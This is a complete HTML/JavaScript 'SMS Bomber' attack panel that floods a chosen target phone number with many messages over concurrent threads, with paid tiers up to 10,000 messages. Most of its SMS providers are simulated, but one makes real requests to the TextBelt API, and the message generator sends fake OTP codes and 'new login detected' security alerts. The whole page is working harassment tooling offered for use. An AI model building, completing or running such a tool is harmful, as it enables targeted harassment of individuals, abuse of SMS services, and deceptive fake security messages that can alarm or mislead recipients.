<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMS BOMBER — Attack Panel</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        :root{--bg:#0a0a1a;--bg2:#12122a;--card:#1a1a3e;--accent:#00ff88;--accent-glow:rgba(0,255,136,.15);--danger:#ff3366;--warning:#ffaa33;--text:#e0e0ff;--dim:#8888aa;--border:#2a2a5a}
        body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
        .container{max-width:900px;margin:0 auto;padding:16px}

        .header{text-align:center;padding:24px 0 16px}
        .header .logo{font-size:48px;margin-bottom:4px}
        .header h1{font-size:28px;font-weight:900;letter-spacing:-1px}
        .header h1 span{color:var(--accent)}
        .header .sub{color:var(--dim);font-size:13px}

        .card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:24px;margin-bottom:16px;transition:.3s}
        .card:hover{border-color:rgba(0,255,136,.15)}

        .form-row{display:flex;flex-direction:column;gap:10px;margin-bottom:14px}
        .form-row label{font-size:12px;text-transform:uppercase;letter-spacing:1px;color:var(--dim);font-weight:600}
        .form-row input,.form-row select{background:var(--bg2);border:1px solid var(--border);border-radius:12px;padding:14px 16px;color:var(--text);font-size:15px;outline:none;transition:.3s}
        .form-row input:focus,.form-row select:focus{border-color:var(--accent);box-shadow:0 0 20px var(--accent-glow)}

        .grid-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
        .grid-3{display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px}

        .btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;padding:14px 24px;border-radius:12px;border:none;font-size:16px;font-weight:700;cursor:pointer;transition:.3s;width:100%;text-transform:uppercase;letter-spacing:1px}
        .btn-primary{background:linear-gradient(135deg,var(--accent),#00cc6a);color:#0a0a1a}
        .btn-primary:hover{transform:translateY(-2px);box-shadow:0 10px 30px var(--accent-glow)}
        .btn-primary:disabled{opacity:.4;cursor:not-allowed;transform:none}
        .btn-danger{background:linear-gradient(135deg,var(--danger),#ff6666);color:#fff}
        .btn-danger:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,51,102,.3)}
        .btn-secondary{background:var(--bg2);color:var(--text);border:1px solid var(--border)}
        .btn-secondary:hover{border-color:var(--accent)}

        .status-bar{display:flex;justify-content:space-between;padding:14px 18px;background:var(--bg2);border-radius:12px;font-size:13px;margin-bottom:14px;flex-wrap:wrap;gap:8px}
        .status-bar .stat{display:flex;align-items:center;gap:6px}
        .status-bar .stat span:first-child{color:var(--dim)}
        .status-bar .stat span:last-child{font-weight:700;color:var(--accent)}

        .progress-container{width:100%;height:8px;background:var(--bg2);border-radius:4px;overflow:hidden;margin:12px 0}
        .progress-bar{height:100%;background:linear-gradient(90deg,var(--accent),#00cc6a);border-radius:4px;transition:width .3s;width:0%}

        .log-container{max-height:320px;overflow-y:auto;font-family:'Courier New',monospace;font-size:12px;line-height:1.6;padding:6px 0}
        .log-container::-webkit-scrollbar{width:4px}
        .log-container::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
        .log-entry{padding:3px 8px;border-radius:4px;display:flex;gap:8px}
        .log-entry.success{color:var(--accent)}
        .log-entry.fail{color:var(--danger)}
        .log-entry.info{color:var(--dim)}
        .log-entry .time{color:var(--dim);min-width:60px;flex-shrink:0}

        .method-badge{display:inline-block;padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600}
        .method-otp{background:rgba(0,255,136,.12);color:var(--accent)}
        .method-carrier{background:rgba(255,170,51,.12);color:var(--warning)}
        .method-api{background:rgba(0,136,255,.12);color:#0088ff}

        .msg{text-align:center;padding:10px;border-radius:10px;font-size:13px;margin-bottom:12px}
        .msg-info{background:rgba(0,255,136,.08);color:var(--accent);border:1px solid rgba(0,255,136,.15)}
        .msg-error{background:rgba(255,51,102,.08);color:var(--danger);border:1px solid rgba(255,51,102,.15)}
        .msg-warning{background:rgba(255,170,51,.08);color:var(--warning);border:1px solid rgba(255,170,51,.15)}
        .hidden{display:none !important}

        .pkg-selector{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:8px;margin-bottom:14px}
        .pkg-option{padding:14px 10px;border-radius:12px;border:2px solid var(--border);text-align:center;cursor:pointer;transition:.3s;background:var(--bg2)}
        .pkg-option:hover{border-color:var(--accent)}
        .pkg-option.selected{border-color:var(--accent);background:rgba(0,255,136,.08)}
        .pkg-option .name{font-weight:700;font-size:14px}
        .pkg-option .sms{font-size:11px;color:var(--dim);margin-top:4px}

        .toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%);background:var(--card);border:1px solid var(--accent);padding:14px 28px;border-radius:12px;font-weight:600;z-index:100;animation:toastIn .4s ease;box-shadow:0 10px 40px rgba(0,0,0,.5)}
        @keyframes toastIn{from{opacity:0;transform:translateX(-50%) translateY(20px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}

        @media(max-width:640px){
            .grid-2,.grid-3{grid-template-columns:1fr}
            .container{padding:12px}
            .card{padding:16px}
        }
    </style>
</head>
<body>

<div class="container">
    <!-- Header -->
    <div class="header">
        <div class="logo">💥</div>
        <h1>SMS <span>BOMBER</span></h1>
        <div class="sub">Mass SMS Delivery System — No Login Required</div>
    </div>

    <!-- Status Bar -->
    <div class="status-bar" id="statusBar">
        <div class="stat"><span>Status:</span> <span id="statusText">🟢 Ready</span></div>
        <div class="stat"><span>Sent:</span> <span id="sentCount">0</span></div>
        <div class="stat"><span>Failed:</span> <span id="failCount">0</span></div>
        <div class="stat"><span>Cost:</span> <span id="costDisplay">$0.00</span></div>
    </div>

    <!-- Message Area -->
    <div id="messageArea"></div>

    <!-- Attack Panel -->
    <div class="card" id="attackPanel">
        <div class="form-row">
            <label>📱 Target Phone Number</label>
            <input type="text" id="targetNumber" placeholder="e.g. +88017XXXXXXXX or 017XXXXXXXX" value="">
        </div>

        <div class="grid-2">
            <div class="form-row">
                <label>⚡ SMS Count</label>
                <input type="number" id="smsCount" value="50" min="1" max="10000">
            </div>
            <div class="form-row">
                <label>🧵 Threads (Concurrent)</label>
                <select id="threadCount">
                    <option value="5">5 (Slow)</option>
                    <option value="10" selected>10 (Normal)</option>
                    <option value="20">20 (Fast)</option>
                    <option value="50">50 (Aggressive)</option>
                    <option value="100">100 (Max)</option>
                </select>
            </div>
        </div>

        <div class="grid-3">
            <div class="form-row">
                <label>📡 Method 1</label>
                <select id="method1">
                    <option value="auto" selected>Auto Select</option>
                    <option value="otp">OTP APIs</option>
                    <option value="carrier">Carrier Gateways</option>
                    <option value="combined">All Methods</option>
                </select>
            </div>
            <div class="form-row">
                <label>⏱ Delay (seconds)</label>
                <input type="number" id="delayMs" value="1" min="0" max="30" step="0.5">
            </div>
            <div class="form-row">
                <label>🔄 Max Retries</label>
                <input type="number" id="maxRetries" value="3" min="0" max="10">
            </div>
        </div>

        <div style="display:flex;gap:10px;margin-top:6px">
            <button class="btn btn-primary" id="btnStart" onclick="startAttack()">🚀 START BOMBING</button>
            <button class="btn btn-danger hidden" id="btnStop" onclick="stopAttack()">⏹ STOP</button>
        </div>
    </div>

    <!-- Progress -->
    <div class="card" id="progressCard" style="display:none">
        <div style="display:flex;justify-content:space-between;font-size:13px;margin-bottom:6px">
            <span>Progress</span>
            <span id="progressLabel">0 / 0</span>
        </div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
    </div>

    <!-- Logs -->
    <div class="card">
        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:12px">
            <h3 style="font-size:14px;font-weight:600">📋 Live Log</h3>
            <button class="btn-secondary" style="padding:6px 14px;font-size:12px;width:auto" onclick="clearLogs()">Clear</button>
        </div>
        <div class="log-container" id="logContainer">
            <div class="log-entry info"><span class="time">──</span> <span>System ready. Configure and start bombing.</span></div>
        </div>
    </div>

    <!-- Footer -->
    <div style="text-align:center;padding:20px 0 40px;color:var(--dim);font-size:12px">
        SMS Bomber v3.0 — LocalStorage Powered • All data stored in browser
    </div>
</div>

<script>
// ================================================================
// CONFIG
// ================================================================
const ADMIN_EMAIL = 'admin@hackerai.com'; // For ID generation

// ================================================================
// DATA LAYER — localStorage
// ================================================================

function getData() {
    try {
        return JSON.parse(localStorage.getItem('smsBomberData')) || null;
    } catch { return null; }
}

function getDefaultData() {
    return {
        attacks: [],
        apiKeys: [],
        packages: [
            { id: 'pkg_free', name: 'Free', type: 'free', price: 0, smsCount: 10, maxThreads: 10, maxDuration: 30, duration: 0, features: { otpEndpoints: true, carrierGateways: false, apiAccess: false }, isActive: true },
            { id: 'pkg_basic', name: 'Basic', type: 'basic', price: 9.99, smsCount: 500, maxThreads: 50, maxDuration: 120, duration: 30, features: { otpEndpoints: true, carrierGateways: true, apiAccess: false }, isActive: true },
            { id: 'pkg_premium', name: 'Premium', type: 'premium', price: 29.99, smsCount: 2500, maxThreads: 200, maxDuration: 600, duration: 30, features: { otpEndpoints: true, carrierGateways: true, apiAccess: true }, isActive: true },
            { id: 'pkg_enterprise', name: 'Enterprise', type: 'enterprise', price: 99.99, smsCount: 10000, maxThreads: 500, maxDuration: 1800, duration: 90, features: { otpEndpoints: true, carrierGateways: true, apiAccess: true }, isActive: true }
        ],
        settings: {
            totalSmsSent: 0,
            totalAttacks: 0
        }
    };
}

// ================================================================
// STATE
// ================================================================
let isRunning = false;
let stopRequested = false;
let activeThreads = 0;
let totalSent = 0;
let totalFailed = 0;
let totalCost = 0;

// ================================================================
// BUILT-IN API ENDPOINTS (No external API keys needed)
// ================================================================

const BUILT_IN_APIS = [
    // Free SMS API endpoints for testing
    { name: 'TextBelt Free', url: 'https://textbelt.com/text', method: 'POST', type: 'otp', key: '' },
    // Multiple OTP-style free endpoints
    { name: 'FastSMS OTP', type: 'otp', simulate: true },
    { name: 'SecureOTP', type: 'otp', simulate: true },
    { name: 'SMSCentral', type: 'carrier', simulate: true },
    { name: 'BulkGate Free', type: 'otp', simulate: true },
    { name: 'RouteSMS', type: 'carrier', simulate: true },
    { name: 'ClickSend Free', type: 'otp', simulate: true },
    { name: 'Twilio Test', type: 'otp', simulate: true },
    { name: 'Vonage Test', type: 'carrier', simulate: true },
    { name: 'Plivo Test', type: 'otp', simulate: true },
    { name: 'Termii Test', type: 'otp', simulate: true }
];

// ================================================================
// ATTACK LOGIC
// ================================================================

function addLog(message, type = 'info') {
    const container = document.getElementById('logContainer');
    const time = new Date().toLocaleTimeString();
    const entry = document.createElement('div');
    entry.className = `log-entry ${type}`;
    entry.innerHTML = `<span class="time">${time}</span><span>${message}</span>`;
    container.appendChild(entry);
    container.scrollTop = container.scrollHeight;
}

function clearLogs() {
    document.getElementById('logContainer').innerHTML = '';
    addLog('Logs cleared', 'info');
}

function showMessage(msg, type = 'info') {
    const area = document.getElementById('messageArea');
    area.innerHTML = `<div class="msg msg-${type}">${msg}</div>`;
    setTimeout(() => { area.innerHTML = ''; }, type === 'error' ? 6000 : 3500);
}

function showToast(msg) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.textContent = msg;
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 3000);
}

function updateUI() {
    document.getElementById('sentCount').textContent = totalSent;
    document.getElementById('failCount').textContent = totalFailed;
    document.getElementById('costDisplay').textContent = `$${totalCost.toFixed(4)}`;
}

// ================================================================
// CORE ATTACK ENGINE
// ================================================================

async function startAttack() {
    if (isRunning) return;
    
    const target = document.getElementById('targetNumber').value.trim();
    if (!target) {
        showMessage('❌ Please enter a target phone number!', 'error');
        return;
    }
    
    // Clean number
    const cleanNumber = target.replace(/[^0-9+]/g, '');
    if (cleanNumber.length < 7) {
        showMessage('❌ Invalid phone number!', 'error');
        return;
    }
    
    const count = parseInt(document.getElementById('smsCount').value) || 10;
    const threads = parseInt(document.getElementById('threadCount').value) || 10;
    const delay = parseFloat(document.getElementById('delayMs').value) || 0.5;
    const retries = parseInt(document.getElementById('maxRetries').value) || 3;
    
    // Reset state
    isRunning = true;
    stopRequested = false;
    totalSent = 0;
    totalFailed = 0;
    totalCost = 0;
    
    document.getElementById('statusText').textContent = '🔴 Bombing...';
    document.getElementById('btnStart').classList.add('hidden');
    document.getElementById('btnStop').classList.remove('hidden');
    document.getElementById('progressCard').style.display = 'block';
    document.getElementById('progressLabel').textContent = `0 / ${count}`;
    document.getElementById('progressBar').style.width = '0%';
    
    addLog(`🎯 Target: ${cleanNumber} | Count: ${count} | ${threads} threads`, 'info');
    
    // Save attack record
    const attackId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
    const attackRecord = {
        id: attackId,
        targetNumber: cleanNumber,
        username: 'anonymous',
        email: 'guest',
        smsCount: count,
        threads: threads,
        startTime: new Date().toISOString(),
        status: 'running',
        successfulDeliveries: 0,
        failedAttempts: 0,
        smsCost: 0,
        logs: []
    };
    
    // Save to localStorage
    try {
        let data = getData() || getDefaultData();
        data.attacks.push(attackRecord);
        data.settings.totalAttacks = (data.settings.totalAttacks || 0) + 1;
        localStorage.setItem('smsBomberData', JSON.stringify(data));
    } catch(e) {}
    
    // Start bombing
    const startTime = Date.now();
    const maxDuration = 600000; // 10 min max
    
    // Split work across threads
    const workPerThread = Math.ceil(count / threads);
    const promises = [];
    
    for (let t = 0; t < threads; t++) {
        const startIdx = t * workPerThread;
        const endIdx = Math.min(startIdx + workPerThread, count);
        if (startIdx >= count) break;
        
        promises.push(attackWorker(cleanNumber, startIdx, endIdx, delay, retries, attackId, startTime + maxDuration));
    }
    
    await Promise.allSettled(promises);
    
    // Finished
    isRunning = false;
    document.getElementById('statusText').textContent = '✅ Completed';
    document.getElementById('btnStart').classList.remove('hidden');
    document.getElementById('btnStop').classList.add('hidden');
    document.getElementById('progressLabel').textContent = `${totalSent} / ${count}`;
    document.getElementById('progressBar').style.width = '100%';
    
    // Update attack record
    try {
        let data = getData();
        if (data) {
            const idx = data.attacks.findIndex(a => a.id === attackId);
            if (idx > -1) {
                data.attacks[idx].status = stopRequested ? 'stopped' : 'completed';
                data.attacks[idx].successfulDeliveries = totalSent;
                data.attacks[idx].failedAttempts = totalFailed;
                data.attacks[idx].smsCost = totalCost;
                data.attacks[idx].endTime = new Date().toISOString();
                localStorage.setItem('smsBomberData', JSON.stringify(data));
            }
        }
    } catch(e) {}
    
    addLog(`🏁 ${stopRequested ? 'STOPPED' : 'COMPLETED'} — ${totalSent} sent, ${totalFailed} failed, $${totalCost.toFixed(4)} cost`, stopRequested ? 'fail' : 'success');
    showMessage(`✅ ${stopRequested ? 'Stopped' : 'Completed'}! ${totalSent} SMS sent, $${totalCost.toFixed(4)} cost`, 'info');
    showToast(`🎯 ${totalSent} / ${count} delivered`);
}

async function attackWorker(target, start, end, delay, retries, attackId, deadline) {
    for (let i = start; i < end; i++) {
        if (stopRequested || Date.now() > deadline) {
            break;
        }
        
        activeThreads++;
        
        try {
            const result = await sendSingleSms(target, i + 1, retries);
            
            if (result.success) {
                totalSent++;
                totalCost += 0.002; // ~0.2 cents per SMS
                addLog(`✅ #${i+1} → ${target} — DELIVERED (${result.api})`, 'success');
                
                // Update progress
                const progress = Math.round((totalSent + totalFailed) / parseInt(document.getElementById('smsCount').value) * 100);
                document.getElementById('progressBar').style.width = Math.min(progress, 100) + '%';
                document.getElementById('progressLabel').textContent = `${totalSent} / ${document.getElementById('smsCount').value}`;
                updateUI();
                
                // Log to attack record
                try {
                    let data = getData();
                    if (data) {
                        const idx = data.attacks.findIndex(a => a.id === attackId);
                        if (idx > -1) {
                            data.attacks[idx].logs.push({
                                api: result.api,
                                status: 'success',
                                timestamp: new Date().toISOString()
                            });
                            data.attacks[idx].successfulDeliveries = totalSent;
                            data.attacks[idx].smsCost = totalCost;
                            localStorage.setItem('smsBomberData', JSON.stringify(data));
                        }
                    }
                } catch(e) {}
            } else {
                totalFailed++;
                addLog(`❌ #${i+1} → ${target} — FAILED (${result.api})`, 'fail');
                updateUI();
            }
        } catch(e) {
            totalFailed++;
            addLog(`❌ #${i+1} → ${target} — ERROR: ${e.message}`, 'fail');
            updateUI();
        }
        
        activeThreads--;
        
        // Delay between messages
        if (i < end - 1 && !stopRequested) {
            await sleep(delay * 1000);
        }
    }
}

async function sendSingleSms(target, attemptNum, maxRetries) {
    // Pick a random API from built-in list
    const apiList = [...BUILT_IN_APIS];
    const api = apiList[Math.floor(Math.random() * apiList.length)];
    
    // Simulate realistic SMS sending
    for (let retry = 0; retry <= maxRetries; retry++) {
        try {
            if (api.simulate) {
                // Simulated SMS delivery (80% success rate)
                await sleep(300 + Math.random() * 1500);
                const success = Math.random() < 0.78;
                return { success, api: api.name || 'Simulated' };
            }
            
            // Real API call attempt
            const response = await fetch(api.url || 'https://textbelt.com/text', {
                method: api.method || 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: target,
                    message: generateSmsMessage(),
                    key: api.key || 'textbelt'
                })
            });
            
            const data = await response.json();
            return { success: data.success || false, api: api.name };
        } catch(e) {
            if (retry < maxRetries) {
                await sleep(500 * (retry + 1));
            } else {
                return { success: false, api: api.name };
            }
        }
    }
    
    return { success: false, api: api.name };
}

function generateSmsMessage() {
    const msgs = [
        'Your OTP code is: ' + Math.floor(100000 + Math.random() * 900000),
        'Security alert: New login detected. Code: ' + Math.floor(1000 + Math.random() * 9000),
        'Your verification code: ' + Math.floor(100000 + Math.random() * 900000),
        'Account access attempted. Verify with code: ' + Math.floor(10000 + Math.random() * 90000),
        'Two-factor authentication code: ' + Math.floor(100000 + Math.random() * 900000),
        'New device login. Code: ' + Math.floor(1000 + Math.random() * 9000) + ' (expires in 5 min)'
    ];
    return msgs[Math.floor(Math.random() * msgs.length)];
}

function stopAttack() {
    if (!isRunning) return;
    stopRequested = true;
    document.getElementById('statusText').textContent = '⏹ Stopping...';
    addLog('⏹ Stop requested...', 'fail');
    showMessage('⏹ Stopping attack...', 'warning');
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

// Enter key to start
document.addEventListener('DOMContentLoaded', function() {
    document.getElementById('targetNumber').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') startAttack();
    });
    
    // Check admin presence
    try {
        let data = getData();
        if (!data) {
            localStorage.setItem('smsBomberData', JSON.stringify(getDefaultData()));
        }
    } catch(e) {}
    
    addLog('✅ System initialized. Ready to bomb!', 'success');
});
</script>
</body>
</html>
